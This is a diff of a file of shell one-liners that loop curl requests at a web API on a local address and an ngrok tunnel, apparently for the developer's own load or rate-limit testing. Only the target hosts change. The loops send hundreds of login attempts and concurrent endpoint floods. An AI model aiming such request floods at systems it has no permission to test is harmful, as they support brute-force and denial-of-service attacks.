-for /L %i in (1,1,200) do curl -s -o nul -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"username\":\"test\",\"password\":\"test\"}" http://192.168.0.5:8000/api/login/
+for /L %i in (1,1,200) do curl -s -o nul -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"username\":\"test\",\"password\":\"test\"}" http://192.168.1.6:8000/api/login/
 
-for /l %i in (1,1,200) do curl -X GET http://192.168.0.5:8000/api/login/
+for /l %i in (1,1,200) do curl -X GET http://192.168.1.6:8000/api/login/
 
-for /l %i in (1,1,200) do curl -X POST http://192.168.0.5:8000/api/login/
+for /l %i in (1,1,200) do curl -X POST http://192.168.1.6:8000/api/login/
 
 for /L %i in (1,1,100) do (
-    curl -s -X GET http://192.168.0.5:8000/api/login/ &
-    curl -s -X GET http://192.168.0.5:8000/api/users/ &
-    curl -s -X GET http://192.168.0.5:8000/api/products/ &
-    curl -s -X GET http://192.168.0.5:8000/api/orders/ &
-    curl -s -X GET http://192.168.0.5:8000/admin/
+    curl -s -X GET http://192.168.1.6:8000/api/login/ &
+    curl -s -X GET http://192.168.1.6:8000/api/users/ &
+    curl -s -X GET http://192.168.1.6:8000/api/products/ &
+    curl -s -X GET http://192.168.1.6:8000/api/orders/ &
+    curl -s -X GET http://192.168.1.6:8000/admin/
 )
 
 
 for i in {1..200}; do
-    curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' http://192.168.0.5:8000/api/login/
+    curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' http://192.168.1.6:8000/api/login/
 done
 
 for i in {1..200}; do
-    curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' http://192.168.0.5:8000/api/login/
+    curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' http://192.168.1.6:8000/api/login/
 done
 
 for i in {1..200}; do
-    curl -s -o /dev/null -w "%{http_code}\n" -X GET http://192.168.0.5:8000/api/login/
+    curl -s -o /dev/null -w "%{http_code}\n" -X GET http://192.168.1.6:8000/api/login/
 done
 
 for i in {1..100}; do
-    curl -s -X GET http://192.168.0.5:8000/api/login/ &
-    curl -s -X GET http://192.168.0.5:8000/api/users/ &
-    curl -s -X GET http://192.168.0.5:8000/api/products/ &
-    curl -s -X GET http://192.168.0.5:8000/api/orders/ &
-    curl -s -X GET http://192.168.0.5:8000/admin/ &
+    curl -s -X GET http://192.168.1.6:8000/api/login/ &
+    curl -s -X GET http://192.168.1.6:8000/api/users/ &
+    curl -s -X GET http://192.168.1.6:8000/api/products/ &
+    curl -s -X GET http://192.168.1.6:8000/api/orders/ &
+    curl -s -X GET http://192.168.1.6:8000/admin/ &
     wait
 done
 
-for i in {1..150}; do curl -s "https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/search/?q=test" & done
 
-for i in {1..100}; do curl -s -X POST https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/login/ -d "username=test&password=pass" & done
+for i in {1..150}; do curl -s "https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/search/?q=test" & done
 
-for path in /api/login /api/search /api/profile /api/admin /api/settings; do curl -s "https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app$path" & done
+for i in {1..100}; do curl -s -X POST https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/login/ -d "username=test&password=pass" & done
 
-for i in {1..80}; do curl -s -X PUT https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d "name=test" -H "User-Agent: python-requests/2.25.1" & done
+for path in /api/login /api/search /api/profile /api/admin /api/settings; do curl -s "https://pseudocourteous-jasperated-shavonne.ngrok-free.dev$path" & done
+
+for i in {1..80}; do curl -s -X PUT https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d "name=test" -H "User-Agent: python-requests/2.25.1" & done
 
